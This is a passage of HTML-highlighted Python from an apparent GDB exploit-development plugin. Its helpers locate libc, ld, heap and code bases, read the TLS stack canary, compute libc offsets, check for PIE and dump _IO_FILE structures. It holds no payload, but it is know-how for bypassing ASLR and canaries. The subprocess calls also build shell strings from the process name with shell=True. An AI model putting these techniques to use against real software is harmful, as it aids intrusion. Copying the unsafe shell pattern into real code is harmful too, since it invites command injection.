</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="s2">&#34;aarch64&#34;</span> <span class="ow">in</span> <span class="n">info</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">capsize</span> <span class="o">=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">            <span class="n">word</span> <span class="o">=</span> <span class="s2">&#34;gx &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;aarch64&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;aarch64&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="s2">&#34;arm&#34;</span> <span class="ow">in</span> <span class="n">info</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">capsize</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">            <span class="n">word</span> <span class="o">=</span> <span class="s2">&#34;wx &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;arm&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;arm&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">word</span> <span class="o">=</span> <span class="s2">&#34;wx &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">capsize</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">            <span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>  <span class="s2">&#34;i386&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;error&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">procmap</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;info proc exe&#39;</span><span class="p">,</span><span class="n">to_string</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;process.*&#39;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pid</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="o">.</span><span class="n">group</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">maps</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="n">pid</span> <span class="o">+</span> <span class="s2">&#34;/maps&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">infomap</span> <span class="o">=</span> <span class="n">maps</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">maps</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">infomap</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;error&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">iscplus</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&#34;readelf -s &#34;</span> <span class="o">+</span> <span class="n">name</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;CXX&#34;</span> <span class="ow">in</span> <span class="n">data</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getprocname</span><span class="p">(</span><span class="n">relative</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">procname</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;info proc exe&#34;</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">procname</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;exe.*&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;info files&#34;</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">procname</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Symbols from &#34;(.*)&#34;&#39;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">procname</span> <span class="ow">and</span> <span class="n">relative</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">procname</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">procname</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">libcbase</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">infomap</span> <span class="o">=</span> <span class="n">procmap</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;.*libc.*\.so&#34;</span><span class="p">,</span><span class="n">infomap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">libcaddr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;set $libc=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">libcaddr</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">libcaddr</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ldbase</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">infomap</span> <span class="o">=</span> <span class="n">procmap</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;.*ld.*\.so&#34;</span><span class="p">,</span><span class="n">infomap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ldaddr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;set $ld=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ldaddr</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">ldaddr</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getheapbase</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">infomap</span> <span class="o">=</span> <span class="n">procmap</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;.*heap\]&#34;</span><span class="p">,</span><span class="n">infomap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">heapbase</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;set $heap=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">heapbase</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">heapbase</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">codeaddr</span><span class="p">():</span> <span class="c1"># ret (start,end)</span>
</span></span><span class="line"><span class="cl">    <span class="n">infomap</span> <span class="o">=</span> <span class="n">procmap</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">procname</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">pat</span> <span class="o">=</span> <span class="s2">&#34;.*&#34;</span> <span class="o">+</span> <span class="n">procname</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">pat</span><span class="p">,</span><span class="n">infomap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">codebaseaddr</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">codeend</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;set $code=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">codebaseaddr</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">codebaseaddr</span><span class="p">,</span><span class="mi">16</span><span class="p">),</span><span class="nb">int</span><span class="p">(</span><span class="n">codeend</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gettls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">arch</span> <span class="o">=</span> <span class="n">getarch</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;i386&#34;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">vsysaddr</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;info functions __kernel_vsyscall&#34;</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">sysinfo</span><span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;find &#34;</span> <span class="o">+</span> <span class="n">vsysaddr</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;0x[0-9a-z]</span><span class="si">{8}</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">sysinfo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">match</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">tlsaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;error&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">tlsaddr</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;x86-64&#34;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;call (int)arch_prctl(0x1003,$rsp-8)&#34;</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;x/xg $rsp-8&#34;</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;error&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getcanary</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">arch</span> <span class="o">=</span> <span class="n">getarch</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">tlsaddr</span> <span class="o">=</span> <span class="n">gettls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;i386&#34;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x14</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;x/xw &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">tlsaddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">),</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">result</span> <span class="p">,</span><span class="mi">16</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;x86-64&#34;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x28</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;x/xg &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">tlsaddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">),</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">result</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;error&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getoff</span><span class="p">(</span><span class="n">sym</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">libcbase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">int</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">sym</span><span class="o">-</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;x/x &#34;</span> <span class="o">+</span> <span class="n">sym</span> <span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;No symbol&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;0x.*[0-9a-f] &#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">group</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">symaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="p">,</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">symaddr</span><span class="o">-</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">searchcall</span><span class="p">(</span><span class="n">sym</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">procname</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;objdump -d -M intel &#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">iscplus</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34;--demangle &#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">procname</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">call</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span>
</span></span><span class="line"><span class="cl">                <span class="o">+</span> <span class="s2">&#34;| grep </span><span class="se">\&#34;</span><span class="s2">call.*&#34;</span> <span class="o">+</span> <span class="n">sym</span> <span class="o">+</span> <span class="s2">&#34;@plt&gt;</span><span class="se">\&#34;</span><span class="s2">&#34;</span>  <span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">call</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;symbol not found&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ispie</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">procname</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&#34;readelf -h &#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">procname</span> <span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;DYN&#34;</span><span class="p">,</span><span class="n">result</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_reg</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;info register &#34;</span> <span class="o">+</span> <span class="n">reg</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">showfp</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">addr</span> <span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;p *(struct _IO_FILE_plus *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Can&#39;t not access 0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;You need to specify an address&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">showfpchain</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">getarch</span><span class="p">()</span>
